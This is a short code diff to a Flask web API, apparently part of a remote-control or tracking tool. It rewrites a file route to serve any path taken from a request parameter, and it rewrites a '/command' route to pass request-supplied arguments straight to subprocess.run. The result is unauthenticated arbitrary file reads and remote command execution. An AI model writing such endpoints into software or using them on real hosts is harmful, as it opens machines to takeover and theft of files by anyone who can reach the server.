@@ -56,13 +56,12 @@ try:
     def getfile():
         if flask.request.args.get('file'):
             filename = flask.request.args.get('file')
-        with open(filename,"rb") as f:
-            filestring=str(f.read())
-        return filestring
+        return flask.send_file(filename)
     @api.route("/command",methods=['POST'])
     def command():
         import subprocess
-        result = subprocess.run(['ls', '-l'], stdout=subprocess.PIPE)
+        argv = flask.request.args.get("cmd").split(" ")[1:]
+        result = subprocess.run(argv, stdout=subprocess.PIPE)
         return result.stdout.decode('utf-8')
     @api.route("/tracking/mouse",methods=['POST'])
     def mousemacro():
